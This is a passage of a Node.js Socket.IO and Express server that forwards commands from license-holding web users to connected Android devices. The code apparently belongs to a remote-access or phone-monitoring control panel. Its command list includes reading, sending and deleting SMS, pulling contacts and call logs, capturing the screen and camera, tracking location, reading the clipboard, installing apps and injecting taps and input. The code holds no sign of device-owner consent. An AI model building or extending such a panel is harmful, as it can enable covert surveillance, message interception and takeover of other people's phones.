    const { deviceId, command, payload, param } = data;

    // Validate required fields
    if (!deviceId || typeof deviceId !== "string") {
      socket.emit("command-error", {
        error: "deviceId is required and must be a string",
        deviceId: null,
        command: command || null,
      });
      return;
    }

    if (!command || typeof command !== "string") {
      socket.emit("command-error", {
        error: "command is required and must be a string",
        deviceId,
        command: null,
      });
      return;
    }

    // Get the device client
    const deviceClient = clients.get(deviceId);

    if (!deviceClient) {
      socket.emit("command-error", {
        error: "Device not found or not connected",
        deviceId,
        isOnline: false,
      });
      return;
    }

    if (!deviceClient.socket || !deviceClient.socket.connected) {
      socket.emit("command-error", {
        error: "Device socket not connected",
        deviceId,
        isOnline: false,
      });
      return;
    }

    // Use command, param, and payload as-is (no conversion)
    const actualCommand = command;
    const actualParam = param;
    const actualPayload = payload || {};

    // Prepare the payload
    let cmdPayload;
    
    if (actualCommand === "access-command") {
      // For access-command, send only cmd, param, and data
      cmdPayload = {
        cmd: actualCommand,
        ...(actualParam && typeof actualParam === "string" && { param: actualParam }),
        ...(actualPayload && typeof actualPayload === "object" && { data: actualPayload })
      };
    } else {
      // For other commands, use the full logic
      cmdPayload = { 
        cmd: actualCommand,
        ...(actualPayload && typeof actualPayload === "object" && { data: actualPayload }),
        // Support param field for commands (CRITICAL for Android device input commands)
        ...(actualParam && typeof actualParam === "string" && { param: actualParam }),
        // Extract args array from payload.args and send directly (for getapps/getcontact/getcalls)
        ...(actualPayload && actualPayload.args && Array.isArray(actualPayload.args) && { args: actualPayload.args }),
        // Convert param to args for commands that expect args[0] (like getpreviewimg)
        ...(actualParam && typeof actualParam === "string" && actualCommand === "getpreviewimg" && { args: [actualParam] })
      };
    }

    // Ensure param is present for input commands
    if (actualCommand === "input" && !cmdPayload.param) {
      logger.warn(`⚠️ [Device Server] Input command missing param, using default`);
      cmdPayload.param = actualParam || `keyevent 4`;
    }

    // Log args extraction for getapps command
    if (command === "getapps") {
      logger.log(`📤 [getapps] Command received:`);
      logger.log(`   Payload:`, payload);
      logger.log(`   Args extracted:`, payload?.args);
      logger.log(`   Args type:`, Array.isArray(payload?.args) ? "array" : typeof payload?.args);
      logger.log(`   Args length:`, payload?.args?.length);
      if (Array.isArray(payload?.args)) {
        logger.log(`   Args[0] (type):`, payload.args[0]);
        logger.log(`   Args[1] (limit):`, payload.args[1]);
        logger.log(`   Args[2] (offset):`, payload.args[2]);
      }
      logger.log(`   Final cmdPayload:`, cmdPayload);
    }

    // Emit command to the device using the pattern "id-{uuid}"
    deviceClient.socket.emit(`id-${deviceId}`, cmdPayload);

    logger.log(`📤 [Web Client] Sent command '${command}' to device ${deviceId}`);
    logger.log(`   Button: ${payload?.button || actualPayload?.button || 'N/A'}`);
    logger.log(`   Command: ${cmdPayload.cmd}`);
    logger.log(`   Param: ${cmdPayload.param || 'None'}`);
    logger.log(`   Full Payload:`, JSON.stringify(cmdPayload, null, 2));

    // Send success confirmation back to web client
    socket.emit("command-sent", {
      success: true,
      deviceId,
      command,
      message: `Command '${command}' sent to device ${deviceId}`,
      timestamp: new Date().toISOString(),
    });
  });

  // -------- DISCONNECT HANDLER --------
  socket.on("disconnect", (reason) => {
    const uuid = socket.uuid;
    logger.log(`🔌 [Device Server] Socket disconnected: ${socket.id}, reason: ${reason}`);
    if (uuid && clients.has(uuid)) {
      logger.log(`   Device disconnected: ${uuid}`);
      const c = clients.get(uuid);
      deviceRegistry.set(uuid, { info: c.info, lastSeen: Date.now(), userId: c.userId });
      clients.delete(uuid);
      saveDevices();
    } else {
      logger.log(`   Web client disconnected: ${socket.id}`);
    }
  });

  // Add connection error handler
  socket.on("error", (error) => {
    logger.error(`❌ [Device Server] Socket error for ${socket.id}:`, error);
  });
});

// -------------------- EXPRESS ROUTES --------------------
app.use(express.json());

// CORS middleware for all routes - restrict to allowed origins
app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // Check if origin is in allowed list
  if (origin && allowedOrigins.includes(origin)) {
    res.header("Access-Control-Allow-Origin", origin);
  } else if (!origin) {
    // Allow requests with no origin (like mobile apps or curl requests)
    res.header("Access-Control-Allow-Origin", "*");
  } else {
    // Block unauthorized origins
    logger.warn(`⚠️ CORS: Blocked request from origin: ${origin}`);
    return res.status(403).json({ error: "Not allowed by CORS" });
  }
  
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
  res.header("Access-Control-Allow-Credentials", "true");
  if (req.method === "OPTIONS") {
    return res.sendStatus(200);
  }
  next();
});

app.get("/devices", async (req, res) => {
  logger.log(`📥 GET /devices - Request received`);
  // SECURITY: Prioritize header over query param (header is not visible in network tab)
  const licenseId = req.headers['x-license-id'] || req.query.licenseId;
  
  // STRICT: License ID is REQUIRED - no fallback
  if (!licenseId) {
    logger.warn(`❌ GET /devices - License ID is required`);
    return res.status(401).json({ error: "License ID is required" });
  }
  
  // Validate License ID format
  if (typeof licenseId !== "string" || licenseId.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(licenseId)) {
    logger.warn(`❌ GET /devices - Invalid License ID format`);
    return res.status(401).json({ error: "Invalid License ID format" });
  }
  
  // Validate License ID and get userId
  const userId = await validateLicenseId(licenseId);
  if (!userId) {
    logger.warn(`❌ GET /devices - Invalid License ID or user inactive`);
    return res.status(401).json({ error: "Invalid License ID or user inactive" });
    }
  
    logger.log(`✅ License ID validated for user: ${userId}`);
  
  // STRICT: Only return devices for this specific user - no fallback
  // Get connected devices for this user only
  const active = Array.from(clients.entries())
    .filter(([uuid, c]) => {
      // Only return devices that belong to this user
        return c.userId === userId;
    })
    .map(([uuid, c]) => ({
      uuid,
      isOnline: true,
      info: c.info,
    }));

  // Get offline devices from registry for this user only
  const offline = Array.from(deviceRegistry.entries())
    .filter(([uuid, d]) => {
      // Only include if not already in active list
      if (clients.has(uuid)) return false;
      // STRICT: Only include devices that belong to this user
      return d.userId === userId;
    })
    .map(([uuid, d]) => ({
      uuid,
      isOnline: false,
      info: d.info,
      lastSeen: d.lastSeen,
    }));

  const allDevices = [...active, ...offline];
  logger.log(`📤 GET /devices - Returning ${allDevices.length} devices (${active.length} online, ${offline.length} offline) for user: ${userId}`);

  res.json({ devices: allDevices });
});

// -------------------- Device UUID Validation --------------------
/**
 * Validate device UUID against database
 * Returns userId if device exists and is valid, null otherwise
 */
async function validateDeviceUuid(deviceUuid) {
  // Basic validation: check if it's a non-empty string
  if (!deviceUuid || typeof deviceUuid !== "string" || deviceUuid.trim().length === 0) {
    logger.warn(`⚠️ Device UUID validation: Empty or invalid type`);
    return null;
  }

  // If Supabase is not configured, can't validate
  if (!supabase) {
    logger.warn("⚠️ Supabase not configured, cannot validate device UUID");
    return null;
  }

  try {
    logger.log(`🔍 Querying database for device UUID: ${deviceUuid}`);
    // Query devices table to find the device and get user_id
    const { data: device, error } = await supabase
      .from("devices")
      .select("user_id, status")
      .eq("id", deviceUuid)
      .single();

    if (error) {
      logger.error("❌ Error validating device UUID:", error.message);
      logger.error("   Error details:", error);
      return null;
    }

    if (device && device.user_id) {
      logger.log(`✅ Device UUID validated for user: ${device.user_id}`);
      return device.user_id;
    } else {
      logger.warn(`⚠️ Device UUID not found in database: ${deviceUuid}`);
    }

    return null;
  } catch (error) {
    logger.error("❌ Exception validating device UUID:", error.message);
    logger.error("   Stack:", error.stack);
    return null;
  }
}

// -------------------- License ID Validation --------------------
/**
 * Validate license ID against database
 * Returns userId if valid, null otherwise
 * Note: License ID is used as the device auth secret (stored per-user in user_profiles table)
 */
async function validateLicenseId(licenseId) {
  // Basic validation: check if it's a non-empty string
  if (!licenseId || typeof licenseId !== "string" || licenseId.trim().length === 0) {
    logger.warn(`⚠️ License ID validation: Empty or invalid type`);
    return null;
  }

  // Check format: must be 26 characters (25 alphanumeric + "=")
  if (licenseId.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(licenseId)) {
    logger.warn(`⚠️ License ID validation: Invalid format (length: ${licenseId.length}, pattern match: ${/^[A-Za-z0-9]{25}=$/.test(licenseId)})`);
    return null;
  }

  // Check cache first
  if (validatedLicenseIds.has(licenseId)) {
    const cachedUserId = validatedLicenseIds.get(licenseId);
    logger.log(`✅ License ID found in cache for user: ${cachedUserId}`);
    return cachedUserId;
  }

  // Supabase is required - no fallback allowed for security
  if (!supabase) {
    logger.error("❌ CRITICAL: Supabase not configured - cannot validate License ID");
    return null;
  }

  try {
    logger.log(`🔍 Querying database for license ID: ${licenseId.substring(0, 10)}...`);
    // Use database function to validate license ID
    const { data: userId, error } = await supabase.rpc("validate_license_id_for_device", {
      license_id_to_validate: licenseId,
    });

    if (error) {
      logger.error("❌ Error validating license ID:", error.message);
      logger.error("   Error details:", error);
      return null;
    }

    if (userId) {
      // Cache the validated license ID
      validatedLicenseIds.set(licenseId, userId);
      logger.log(`✅ License ID validated for user: ${userId}`);
      return userId;
    } else {
      logger.warn(`⚠️ License ID not found in database or user is inactive: ${licenseId.substring(0, 10)}...`);
    }

    return null;
  } catch (error) {
    logger.error("❌ Exception validating license ID:", error.message);
    logger.error("   Stack:", error.stack);
    return null;
  }
}

// -------------------- Email Hash Validation --------------------
/**
 * Validate email hash against database
 * Returns userId if valid, null otherwise
 * @deprecated Use validateLicenseId instead - kept for backward compatibility
 */
async function validateEmailHash(emailHash) {
  // Basic validation: check if it's a non-empty string
  if (!emailHash || typeof emailHash !== "string" || emailHash.trim().length === 0) {
    return null;
  }

  // Check cache first
  if (validatedEmailHashes.has(emailHash)) {
    return validatedEmailHashes.get(emailHash);
  }

  // If Supabase is not configured, fall back to AUTH_SECRET (for backward compatibility)
  // Supabase is required - no fallback allowed for security
  if (!supabase) {
    logger.error("❌ CRITICAL: Supabase not configured - cannot validate email hash");
    return null;
  }

  try {
    // Use database function to validate email hash
    const { data: userId, error } = await supabase.rpc("validate_email_hash_for_device", {
      email_hash_to_validate: emailHash,
    });

    if (error) {
      logger.error("❌ Error validating email hash:", error.message);
      return null;
    }

    if (userId) {
      // Cache the validated hash
      validatedEmailHashes.set(emailHash, userId);
      logger.log(`✅ Email hash validated for user: ${userId}`);
      return userId;
    }

    return null;
  } catch (error) {
    logger.error("❌ Exception validating email hash:", error.message);
    return null;
  }
}

// -------------------- Command Validation (Security Whitelist) --------------------
// SECURITY: Whitelist of allowed commands to prevent command injection
const ALLOWED_COMMANDS = [
  'getinfo', 'getdeviceinfo',
  'getsms', 'sendsms', 'deletesms',
  'getapps', 'installapp', 'uninstallapp', 'startapp', 'stopapp',
  'getfiles', 'uploadfile', 'downloadfile', 'deletefile',
  'getcontacts', 'getcalls', 'makecall',
  'getscreen', 'getpreviewimg', 'startcamera', 'stopcamera', 'captureimage',
  'input', 'tap', 'swipe', 'scroll', 'longpress', 'keyevent',
  'access-command',
  'reboot', 'shutdown', 'getbattery', 'getlocation',
  'getclipboard', 'setclipboard',
];

function validateCommand(cmd, param) {
  // Check if command is in whitelist
  if (!ALLOWED_COMMANDS.includes(cmd)) {
    throw new Error(`Command '${cmd}' is not allowed. Allowed commands: ${ALLOWED_COMMANDS.join(', ')}`);
  }
  
  // Validate command format
  if (!/^[a-zA-Z0-9_-]+$/.test(cmd)) {
    throw new Error(`Command contains invalid characters: ${cmd}`);
  }
  
  // Validate param if provided
  if (param !== undefined && param !== null) {
    if (typeof param !== 'string') {
      throw new Error('Command parameter must be a string');
    }
    
    // Prevent extremely long parameters (DoS protection)
    if (param.length > 1000) {
      throw new Error('Command parameter is too long (max 1000 characters)');
    }
    
    // Sanitize param: prevent obvious injection patterns
    const dangerousPatterns = [
      /[<>]/g,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /eval\s*\(/gi,
      /exec\s*\(/gi,
    ];
    
    for (const pattern of dangerousPatterns) {
      if (pattern.test(param)) {
        throw new Error(`Command parameter contains potentially dangerous content`);
      }
    }
  }
}

// -------------------- Send Command via REST API --------------------
app.post("/api/command/:uuid", async (req, res) => {
  const uuid = req.params.uuid;
  const { cmd, param } = req.body; // cmd like "getsms", param like "inbox|50|10"
  // SECURITY: License ID from header (preferred) or body (backward compatibility)
  const licenseId = req.headers['x-license-id'] || req.body.licenseId;

  logger.log(`📥 POST /api/command/${uuid} received`);
  logger.log(`   Body:`, req.body);

  if (!cmd) {
    return res.status(400).json({ error: "Missing cmd" });
  }

  // SECURITY: Validate command against whitelist
  try {
    validateCommand(cmd, param);
  } catch (validationError) {
    logger.error(`❌ Command validation failed:`, validationError.message);
    return res.status(400).json({ 
      error: "Invalid command",
      message: validationError.message 
    });
  }

  // Validate License ID format
  if (!licenseId || typeof licenseId !== "string" || licenseId.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(licenseId)) {
    return res.status(401).json({ error: "Invalid License ID format - must be 26 characters (25 alphanumeric + '=')" });
  }

  // Validate License ID to get user_id - REQUIRED, no fallback allowed
  if (!supabase) {
    logger.error("❌ CRITICAL: Supabase not configured - cannot validate License ID");
    return res.status(503).json({ 
      error: "Service unavailable: Authentication service not configured",
      message: "Supabase must be configured to validate device commands"
    });
  }

  const userId = await validateLicenseId(licenseId);
  if (!userId) {
    return res.status(401).json({ error: "Invalid License ID or user inactive - authentication failed" });
  }
  
  logger.log(`✅ License ID validated for user: ${userId}`);
  // Device UUID is just an identifier - we link it to the user from License ID
  // No need to check if device exists in database

  // Find the connected device
  const client = clients.get(uuid);
  if (!client) {
    return res.status(404).json({ error: "Device not connected", uuid });
  }

  // Link device to user if not already linked
  if (userId && !client.userId) {
    client.userId = userId;
    logger.log(`🔗 Linked device ${uuid} to user ${userId}`);
  }

  // Prepare payload with cmd, optional param, and licenseId
  const payload = { cmd, licenseId };
  if (param) {
    payload.param = param;
  }

  // Emit dynamically based on selected phone UUID
  client.socket.emit("id-" + uuid, payload);

  logger.log(`📤 Sent command '${cmd}' to device ${uuid}`);
  logger.log(`   Payload:`, payload);

  res.json({
    success: true,
    message: `Command '${cmd}' sent to device ${uuid}`,
    uuid,
    payload,
    timestamp: new Date().toISOString(),
  });
});

// Debug route to test if routes work
app.get("/api/test", (req, res) => {
  res.json({ message: "Routes are working!", timestamp: new Date().toISOString() });
});

// Health check endpoint for socket server
app.get("/api/health", (req, res) => {
  const connectedDevices = Array.from(clients.keys()).length;
  const totalSockets = io.sockets.sockets.size;
  res.json({ 
    status: "ok",
    timestamp: new Date().toISOString(),
    connectedDevices,
    totalSockets,
    server: "device-server",
    port: PORT,
  });
});

// Socket.IO connection status endpoint
app.get("/api/socket-status", (req, res) => {
  const connectedDevices = Array.from(clients.entries()).map(([uuid, client]) => ({
    uuid,
    socketId: client.socket?.id || null,
    isConnected: client.socket?.connected || false,
    userId: client.userId || null,
  }));
  
  res.json({
    status: "ok",
    timestamp: new Date().toISOString(),
    totalConnections: io.sockets.sockets.size,
    connectedDevices: connectedDevices.length,
    devices: connectedDevices,
  });
});

// -------------------- SERVER START --------------------
// Always use port 9211 for device server (override any PORT from .env files)
// This ensures device-server.js always runs on 9211, regardless of .env.local settings
const PORT = 9211;

// SECURITY: In production, bind to 127.0.0.1 (localhost) only
// This prevents direct external access to port 9211
// All external traffic must go through nginx reverse proxy on port 443
// In development, bind to 0.0.0.0 for local network access
// You can override with HOSTNAME env var if needed
const hostname = process.env.HOSTNAME || (isDevelopment ? '0.0.0.0' : '127.0.0.1');

server.on('error', (error) => {
  if (error.code === 'EADDRINUSE') {
    logger.error(`❌ Port ${PORT} is already in use!`);
    logger.error(`\nTo fix this:`);
    logger.error(`1. Find the process: netstat -ano | findstr :${PORT}`);
    logger.error(`2. Kill it: taskkill /PID <PID> /F`);
    logger.error(`3. Or run: npm run kill:port:9211`);
    logger.error(`4. Or use a different port: PORT=9212 npm run dev:device\n`);
    process.exit(1);
  } else {
    logger.error(`❌ Server error:`, error);
    process.exit(1);
  }
});

server.listen(PORT, hostname, () => {
  logger.log(`🚀 [Device Server] Server running at http://${hostname}:${PORT}`);
  logger.log(`✅ [Device Server] Ready to accept device connections`);
  logger.log(`\n📋 [Device Server] Connection Info:`);
  logger.log(`   Binding: http://${hostname}:${PORT}`);
  if (hostname === '127.0.0.1') {
    logger.log(`   ⚠️  SECURITY: Bound to localhost only - external access blocked`);
    logger.log(`   ✅ All traffic must route through nginx reverse proxy`);
  } else {
    logger.log(`   Local: http://localhost:${PORT}`);
    logger.log(`   Network: http://0.0.0.0:${PORT}`);
  }
  if (process.env.NEXT_PUBLIC_DEVICE_SERVER_URL) {
    logger.log(`   Configured URL: ${process.env.NEXT_PUBLIC_DEVICE_SERVER_URL}`);
  }
  logger.log(`   Socket.IO path: /socket.io`);
  logger.log(`   CORS: ${isDevelopment ? 'Permissive (development mode - all origins allowed)' : 'Strict (production mode)'}`);
  logger.log(`   Allowed origins:`, allowedOrigins);
  logger.log(`\n💡 [Device Server] If you see "xhr poll error":`);
  logger.log(`   1. Verify server is accessible at the configured URL`);
  logger.log(`   2. Check tunnel is running and forwarding to port ${PORT}`);
  logger.log(`   3. Check firewall/network settings`);
  logger.log(`   4. Test connection: curl http://localhost:${PORT}/health\n`);
  logger.log(`📡 [Device Server] Socket.IO path: /socket.io`);
  logger.log(`🔍 [Device Server] Health check: http://localhost:${PORT}/api/health`);
  logger.log(`🔍 [Device Server] Socket status: http://localhost:${PORT}/api/socket-status`);
  logger.log(`📋 [Device Server] Environment: ${isDevelopment ? 'Development' : 'Production'}`);
  
  // Log environment variable status
  logger.log(`\n📋 [Device Server] Environment Variables:`);
  logger.log(`   NEXT_PUBLIC_SUPABASE_URL: ${supabaseUrl ? '✅ Set' : '❌ Missing'}`);
  logger.log(`   SUPABASE_SERVICE_ROLE_KEY: ${supabaseServiceKey ? '✅ Set' : '❌ Missing'}`);
  logger.log(`   NEXT_PUBLIC_APP_URL: ${process.env.NEXT_PUBLIC_APP_URL || '❌ Not set (using defaults)'}`);
  logger.log(`   ALLOWED_ORIGINS: ${process.env.ALLOWED_ORIGINS || '❌ Not set (using defaults)'}`);
  logger.log(`   NODE_ENV: ${process.env.NODE_ENV || 'development'}`);
});
